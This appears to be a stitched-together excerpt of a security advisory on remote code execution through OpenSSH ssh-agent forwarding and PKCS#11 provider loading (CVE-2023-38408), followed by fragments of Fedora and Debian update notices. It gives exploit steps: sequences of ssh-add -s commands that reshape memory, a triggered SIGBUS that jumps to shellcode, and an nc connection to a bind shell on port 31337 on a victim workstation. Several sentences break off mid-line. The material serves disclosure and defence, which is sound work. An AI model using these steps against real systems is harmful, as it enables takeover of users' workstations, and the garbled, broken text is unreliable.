Could not add card "/usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1": agent refused operation

------------------------------------------------------------------------

3e/ we remotely alter the mmap layout of ssh-pkcs11-helper (again), and
replace the unmapped SIGBUS handler's code with another piece of code (a
useful gadget) from another shared library:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-http-protocol-unix.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/sane/libsane-hp.so.1.0.32
server# ssh-add -s /usr/lib/libreoffice/program/libindex_data.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/gstreamer-1.0/libgstaudiorate.so
server# ssh-add -s /usr/lib/libreoffice/program/libscriptframe.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libisccc-9.16.15-Ubuntu.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libxkbregistry.so.0.0.0

------------------------------------------------------------------------

3f/ we remotely raise a SIGBUS in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/debug/.build-id/15/c0bee6bcb06fbf381d0e0e6c52f71e1d1bd694.debug
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3g/ the replacement code (gadget) is executed (instead of the unmapped
SIGBUS handler's code) and jumps to the stack, then into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGBUS handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

========================================================================
Callback function use-after-free
========================================================================

While analyzing the first results of our fuzzer, we noticed that some
combinations of shared libraries jump to the stack although they do not
register any signal handler or raise any signal; how is this possible?
On investigation, we understood that:

- a core library (for example, libgcrypt.so or libQt5Core.so) is loaded
  but not unloaded (munmap()ed) by dlclose(), because it is marked as
  "nodelete" by the loader;

- a shared library (for example, libgnunetutil.so or gammaray_probe.so)
  is loaded and registers a userland callback function with the core
  library (via gcry_set_allocation_handler() or qtHookData[], for
  example), but it does not deregister this callback function when
  dlclose()d (i.e., when its code is munmap()ed);

- another shared library is loaded (mmap()ed) and replaces the unmapped
  callback function's code with another piece of code (a useful gadget);

- yet another shared library is loaded and calls one of the core
  library's functions, which in turn calls the unmapped callback
  function and therefore executes the replacement code (the useful
  gadget) instead, thus jumping to the stack.

------------------------------------------------------------------------

In the following example, one of the core library's functions is called
at line 66254, the unmapped callback function is called at line 66288,
the replacement code (gadget) is executed instead at line 66289, and
jumps to the stack at line 66293 (ssh-pkcs11-helper segfaults here
because we did not make the stack executable):

Note: several shared libraries that are installed by default on Ubuntu
Desktop (for example, gkm-*-store-standalone.so) do not have constructor
or destructor functions, but they are actual PKCS#11 providers, so some
of their functions are explicitly called by ssh-pkcs11-helper, and these
functions register a callback function with libgcrypt.so but they do not
deregister it when dlclose()d (i.e., when munmap()ed), thus exhibiting
the "Callback function use-after-free" behavior presented in this
subsection.

In the following example, one of libgcrypt.so's functions is called at

replacement code (gadget) is executed instead at line 79144, and jumps

Return from syscall use-after-free

While analyzing the strace logs of the dlopen() and dlclose() of every
shared library in /usr/lib*, we spotted an unusual SIGSEGV:

- a shared library is loaded, and its constructor function starts a
  thread that sleeps for 10 seconds in kernel-land:

------------------------------------------------------------------------

------------------------------------------------------------------------

- meanwhile, the main thread (ssh-pkcs11-helper) unloads this shared
  library (because it is not an actual PKCS#11 provider) and therefore
  munmap()s the code where the sleeping thread should return to after
  its sleep in kernel-land:

------------------------------------------------------------------------
3631347 socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 3
3631347 connect(3, {sa_family=AF_UNIX, sun_path="/dev/log"}, 110) = 0

3631347 close(3)                        = 0
3631347 munmap(0x7f5f3c3fb000, 33296)   = 0
------------------------------------------------------------------------

- the sleeping thread returns from kernel-land and crashes with a
  SIGSEGV because its userland code (at 0x7f5f3c3fecff) was unmapped:

------------------------------------------------------------------------
3631372 <... clock_nanosleep resumed>0x7f5f3bd6fde0) = 0
3631372 --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7f5f3c3fecff} ---
------------------------------------------------------------------------

Of course, we can request ssh-pkcs11-helper to load (mmap()) a
"nodelete" library before the sleeping thread returns from kernel-land,
thus replacing the unmapped userland code with another piece of code (a
hopefully useful gadget). In the following example, the sleeping thread
returns from kernel-land after line 214, executes the replacement code
(gadget) at line 256, and jumps to the stack at line 1305:

Sigaltstack use-after-free
========================================================================

>From time to time, we noticed the following warning in the dmesg of our
fuzzing laptop:

------------------------------------------------------------------------
[585902.691238] signal: ssh-pkcs11-help[1663008] overflowed sigaltstack
------------------------------------------------------------------------

On investigation, we discovered that at least one shared library
(libgnatcoll_postgres.so) calls sigaltstack() to register an alternate
signal stack (used by SA_ONSTACK signal handlers) when dlopen()ed, and
then munmap()s this signal stack without deregistering it (SS_DISABLE)
when dlclose()d. Consequently, we implemented and tested a different
attack idea:

- we randomly load zero or more shared libraries that permanently alter
  the mmap layout;

- we load libgnatcoll_postgres.so, which registers an alternate signal
  stack and then munmap()s it without deregistering it;

- we randomly load zero or more shared libraries that alter the mmap
  layout (again), and hopefully replace the unmapped signal stack with
  another writable memory mapping (for example, a thread stack, or a
  .data or .bss segment);

- we randomly load one shared library that registers an SA_ONSTACK
  signal handler but does not munmap() its code when dlclose()d (unlike
  our original "Signal handler use-after-free" attack);

- we randomly load one shared library that raises this signal and
  therefore calls the SA_ONSTACK signal handler, thus overwriting the
  replacement memory mapping with stack frames from the signal handler;

- we randomly load one or more shared libraries that hopefully use the
  overwritten contents of the replacement memory mapping.

Although we successfully found various combinations of shared libraries
that overwrite a .data or .bss segment with a stack frame from a signal
handler, we failed to overwrite a useful memory mapping with useful data
(e.g., we failed to magically jump to the stack); for this attack to
work, more research and a finer-grained approach might be required.

========================================================================
Sigreturn to arbitrary instruction pointer
========================================================================

Astonishingly, numerous combinations of shared libraries crash because
they try to execute code at 0xcccccccccccccccc: a direct control of the
instruction pointer (RIP), because these 0xcc bytes come from the stack
buffer of ssh-pkcs11-helper that we (remote attackers) filled with 0xcc
bytes.

Initially, we got very excited by this new attack vector, because we
thought that a gadget of the form "add rsp, N; ret" was executed, thus
moving the stack pointer (RSP) into our 0xcc-filled stack buffer and
popping RIP from there. Unfortunately, the reality is more complex:

- a shared library raises a signal (a SIGSEGV in the example below, at
  line 134110) and, in consequence of a "Signal handler use-after-free",
  a replacement gadget of the form "ret N" is executed instead of the
  signal handler (at line 134111);

- exactly as the real signal handler would, the replacement gadget
  returns to the glibc's restore_rt() function (at line 134112), which
  in turn calls the kernel's rt_sigreturn() function (at line 134113);

- however, before the kernel's rt_sigreturn() function is called, the
  replacement gadget "ret N" moves RSP into our 0xcc-filled stack buffer
  and as a result, the kernel's rt_sigreturn() function restores all
  userland registers (including RIP and RSP) from there;

------------------------------------------------------------------------

Although we directly control all of the userland registers, we failed to
transform this attack vector into a one-shot remote exploit, because RSP
(which was conveniently pointing into our 0xcc-filled stack buffer) gets
overwritten, and because we were unable to leak any information from
ssh-pkcs11-helper (to defeat ASLR).

Partially overwriting a pointer that is left over in ssh-pkcs11-helper's
stack buffer, and that is later used by rt_sigreturn() to restore a
userland register, might be an interesting idea that we have not
explored yet.

========================================================================
_Unwind_Context type-confusion
========================================================================

This attack vector was the most puzzling of our discoveries: from time
to time, some combinations of shared libraries jumped to the stack, but
evidently not as a result of a signal handler, callback function, or
return from syscall use-after-free. Eventually, we determined the
sequence of events that led to these stack jumps:

- some shared libraries load LLVM's libunwind.so as a "nodelete" library
  (i.e., it is never unloaded, even after dlclose());

- some shared libraries throw a C++ exception, which loads GCC's
  libgcc_s.so and calls the _Unwind_GetCFA() function (at line 57295 in
  the example below);

- however, GCC's libgcc_s.so mistakenly calls LLVM's _Unwind_GetCFA()
  (at line 57298) instead of GCC's _Unwind_GetCFA() (because LLVM's
  libunwind.so was loaded first), and passes a pointer to GCC's struct
  _Unwind_Context to this function (instead of a pointer to LLVM's
  struct _Unwind_Context, which is a different type of structure);

- LLVM's _Unwind_GetCFA() then calls its unw_get_reg() function (at line
  57303), which in turn calls a function pointer (at line 57311) that is
  a member of LLVM's struct _Unwind_Context, but that happens to be a
  stack pointer in GCC's struct _Unwind_Context;

========================================================================
RCE in library constructor
========================================================================

As a last and extreme example of a remote attack against ssh-agent
forwarding, we noticed that one shared library's constructor function
(which can be invoked by a remote attacker via an ssh-agent forwarding)
starts a server thread that listens on a TCP port, and we discovered a
remotely exploitable vulnerability (a heap-based buffer overflow) in
this server's implementation.

The unusual malloc exploitation technique that we used to remotely
exploit this vulnerability is so interesting (it is reliable, one-shot,
and works against the latest glibc versions, despite all the modern
protections) that we decided to publish it in a separate advisory:

    <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fwww.qualys.com%2F2023%2F06%2F06%2Frenderdoc%2Frenderdoc.txt&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=nofBS%2FHzMRkvCgf%2FnCVxTNk7qQdAy84QcWuVMsaxPl4%3D&reserved=0><<https://www.qualys.com/2023/06/06/renderdoc/renderdoc.txt>>

This last and extreme attack vector against ssh-agent also underlines
the central point of this advisory: many shared libraries are simply not
safe to be loaded (and unloaded) in a security-sensitive program such as
ssh-agent.

========================================================================
Discussion
========================================================================

We believe that we have not exploited the full potential of this
"dlopen() then dlclose()" primitive:

- we have only investigated Ubuntu Desktop 22.04 and 21.10, but other
  versions, distributions, or operating systems might be hiding further
  surprises;

- our rudimentary fuzzer can certainly be greatly improved, and has
  definitely not tried all the combinations of shared libraries and side
  effects;

- we have identified seven attack vectors against ssh-agent (described
  in the "Results" section), but we have not analyzed in detail all the
  results of our fuzzer;

- we have not fully explored various aspects of these attack vectors:

  - it might be possible to reliably exploit the "Sigaltstack
    use-after-free" (by carefully overwriting the .data or .bss segment
    of a shared library) or the "Sigreturn to arbitrary instruction
    pointer" (by partially overwriting a leftover pointer in
    ssh-pkcs11-helper's stack);

  - we currently store our shellcode in ssh-pkcs11-helper's main() stack
    buffer only, but it might be possible to store shellcode in other
    stack buffers as well, or somehow spray the stack with shellcode,
    which would dramatically increase our chances of jumping into our
    shellcode;

    for example, we tried to spray the stack with shellcode by
    interrupting a memcpy() of controlled data with a signal handler,
    thereby spilling controlled YMM registers to the stack (inspired by
    <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fbugs.chromium.org%2Fp%2Fproject-zero%2Fissues%2Fdetail%3Fid%3D2266&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=mYENYDFpftGaac%2B5%2BGJcg%2FAKFVZhh%2BIyb6TLmRaMsfI%3D&reserved=0>)<<https://bugs.chromium.org/p/project-zero/issues/detail?id=2266>>, but
    we failed because we can memcpy() only ~10KB of data, and because we
    cannot remotely use tricks such as inotify or sched*() to precisely
    time this race;

  - it might be possible to control the mmap layout of ssh-pkcs11-helper
    with page precision (which would allow us to precisely control the
    gadget that replaces the unmapped signal handler, callback function,
    or return from syscall), but we failed to find large malloc()ations
    (which are mmap()ed) in ssh-pkcs11-helper (the only way we found to
    influence the mmap layout is to load and unload shared libraries, as
    mentioned in Step 4a/ of the "Experiments" section);

  - instead of replacing the unmapped signal handler or callback
    function (or return from syscall) with a gadget from another shared
    library, it is perfectly possible to replace it with an executable
    thread stack (made executable by loading an "execstack" library),
    but we have failed so far to control the contents of such a thread
    stack.

Fedora Update Notification
FEDORA-2023-878e04f4ae
2023-07-23 01:27:02.654081
--------------------------------------------------------------------------------

Name : openssh
Product : Fedora 38
Version : 9.0p1
Release : 16.fc38
URL : <http://www.openssh.com/portable.html>
Summary : An open source implementation of SSH protocol version 2
Description :
SSH (Secure SHell) is a program for logging into and executing
commands on a remote machine. SSH is intended to replace rlogin and
rsh, and to provide secure encrypted communications between two
untrusted hosts over an insecure network. X11 connections and
arbitrary TCP/IP ports can also be forwarded over the secure channel.

OpenSSH is OpenBSD's version of the last free version of SSH, bringing
it up to date in terms of security and features.

This package includes the core files necessary for both the OpenSSH
client and server. To make this package useful, you should also
install openssh-clients, openssh-server, or both.

This checks via nlist(3) that candidate provider libraries contain one
of the symbols that we will require prior to dlopen(), which can cause
a number of side effects, including execution of constructors.

Package        : openssh
Version        : 1:7.9p1-10+deb10u3
CVE ID         : CVE-2023-38408
Debian Bug     : 1042460

It was discovered that OpenSSH incorrectly handled loading certain
PKCS#11 providers. If a user forwarded their ssh-agent to an untrusted
system, a remote attacker could possibly use this issue to load
arbitrary libraries from the userâs system and execute arbitrary code.

In addition to the above security issue, this update also fixed
another bug - bad interaction between the ssh_config ConnectTimeout
and ConnectionAttempts directives - connection attempts after the
first attempt were ignoring the requested timeout. More details about
this can be found at <https://bugzilla.mindrot.org/show_bug.cgi?id=2918>.

For Debian 10 buster, this problem has been fixed in version
1:7.9p1-10+deb10u3.

We recommend that you upgrade your openssh packages.

For the detailed security status of openssh please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/openssh>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
